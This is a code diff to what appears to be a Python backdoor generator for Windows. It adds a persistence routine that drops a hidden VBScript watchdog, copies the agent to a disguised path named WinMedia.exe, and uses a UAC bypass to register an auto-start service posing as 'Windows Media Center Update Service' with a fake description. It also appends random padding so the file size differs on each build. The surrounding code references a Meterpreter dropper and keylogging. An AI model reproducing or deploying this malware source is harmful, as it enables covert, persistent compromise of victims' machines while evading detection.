@@ -42,9 +42,9 @@ else:
 	serverName = "server.py"
 
 if args.proxy:
-	proxysetting = 'useproxy = True**n'
+	proxysetting = 'useproxy = True'
 else:
-	proxysetting = 'useproxy = False**n'
+	proxysetting = 'useproxy = False'
 
 pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
@@ -79,6 +79,27 @@ def Wget(file):
 	filename = file.split('/')[-1]
 	with open(pwd.strip('**r') + os.sep + filename,'wb') as o:
 		o.write(down.read())
+
+def fpersist():
+	vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
+	with open(vbsdst, 'w') as pv:
+		pv.write(vbscript)
+	win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
+	cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
+	cmds += 'sc create %s binPath= "cmd.exe /c wscript.exe ' % (servicename) + vbsdst + '" type= own start= auto**n'
+	cmds += 'del ' + tempvbs + '**n'
+	cmds += 'sc description ' + servicename + ' ' + servicedisc + '**n'
+	cmds += 'del /AH "%~f0" & sc start ' + servicename + '**n'
+	hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
+	with open(tempvbs, 'w') as hid:
+		hid.write(hb)
+	with open(tempbat, 'w') as cbat:
+		cbat.write(cmds)
+	win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
+	win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
+	rcmd = tempvbs + ' ' + tempbat
+	fbypass(rcmd)
+	exit()
 
 def MeterDrop(mhost, mport):
 	try:
@@ -204,9 +225,11 @@ if os.name == 'nt':
 
 	# These are permanent (used for persistence):
 	
-	agent = os.getenv('WINDIR') + '%sIME%simekr8%sdicts%ssrvhost.exe' % (os.sep, os.sep, os.sep, os.sep)
+	agent = os.getenv('WINDIR') + '%sIME%simekr8%sdicts%sWinMedia.exe' % (os.sep, os.sep, os.sep, os.sep)   
 	agentname = agent.split(os.sep)[-1]
-	vbsdst = os.getenv('APPDATA') + '%s..%sLocal%salloc.vbs' % (os.sep, os.sep, os.sep)
+	vbsdst = os.getenv('APPDATA') + '%s..%sLocal%sWindowsMediaUpdate.vbs' % (os.sep, os.sep, os.sep) 
+	servicename = '"' + 'Windows Media Center Update Service' + '"'
+	servicedisc = '"' + 'Windows Media Center Update Service for installation, modification, and removal of Windows updates and optional components. If this service is disabled, install or uninstall of Windows updates might fail for this computer.' + '"'
 
 	#																								  #
 	###################################################################################################
@@ -231,25 +254,7 @@ if os.name == 'nt':
 			pass
 '''
 persistpart = '''	else:
-		if isAdmin:
-			vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
-			with open(vbsdst, 'w') as pv:
-				pv.write(vbscript)
-			win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
-			cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
-			cmds += 'sc create win32svc binPath= "cmd.exe /c wscript.exe ' + vbsdst + '" type= own start= auto**n'
-			cmds += 'del ' + tempvbs + '**n'
-			cmds += 'del /AH "%~f0" & sc start win32svc'
-			hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
-			with open(tempvbs, 'w') as hid:
-				hid.write(hb)
-			with open(tempbat, 'w') as cbat:
-				cbat.write(cmds)
-			win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
-			win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
-			rcmd = tempvbs + ' ' + tempbat
-			fbypass(rcmd)
-			exit()
+		fpersist()
 '''
 part2 = '''
 	if is64:
@@ -408,26 +413,9 @@ while 1:
 		if os.name == 'nt':
 			if isAdmin:																					## If the current user is admin we will use bypassuac to install a system service with a vbs script that keeps our agent alive ;)
 				if not os.path.isfile(vbsdst):
-					vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
-					with open(vbsdst, 'w') as pv:
-						pv.write(vbscript)
-					win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
-					cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
-					cmds += 'sc create win32svc binPath= "cmd.exe /c wscript.exe ' + vbsdst + '" type= own start= auto**n'
-					cmds += 'del ' + tempvbs + '**n'
-					cmds += 'del /AH "%~f0" & sc start win32svc**n'
-					hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
-					with open(tempvbs, 'w') as hid:
-						hid.write(hb)
-					with open(tempbat, 'w') as cbat:
-						cbat.write(cmds)
-					win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
-					win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
-					rcmd = tempvbs + ' ' + tempbat
-					fbypass(rcmd)
-					exit()
+					fpersist()
 				else:
-					fbypass('sc start win32svc')
+					fbypass('sc start ' + servicename)
 			else:																						## As a regualr user all we can do is search for system services with weak directory permisssions
 				vulnpaths = ''
 				winservices = fsubprocess(''' + complexcommand + ''')
@@ -511,7 +499,7 @@ while 1:
 		sendAES(result)
 
 s.close()
-'''
+''' + randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
 
 if args.persistence:
 	finalbackdoor = part1 + persistpart + part2
@@ -526,9 +514,9 @@ encrypted = EncodeAES(cipherEnc, readyscript)
 f.write('''#!/usr/bin/env python
 import ''')
 
-myimports = ['subprocess', 'platform', 'socket', 'base64','os,struct','urllib2','binascii','ctypes','threading','string','sqlite3']
-myendings = ['from Crypto import Random','from Crypto.Cipher import AES as %s' % (AESvar),'from base64 import b64decode as %s' % (b64var)]
-mywindows = ['win32api','win32gui','win32file','win32console','win32crypt','pyHook','pythoncom','win32con']
+myimports = ['subprocess', 'platform', 'socket', 'base64', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3']
+myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (b64var)]
+mywindows = ['win32api', 'win32gui', 'win32file', 'win32console', 'win32crypt', 'pyHook', 'pythoncom', 'win32con']
 
 if args.proxy:
 	mywindows.append('socks')
@@ -602,7 +590,7 @@ def fnextcmd():
 
 	elif nextcmd.startswith('persistence'):
 		if isAdmin:
-			print ' [*] Installing system persistence service, win32svc..'
+			print ' [*] Installing system persistence service.'
 			print ' [*] Persistence installed.'
 			encrypted = EncodeAES(cipher, "persistence")
 			s.send(encrypted)
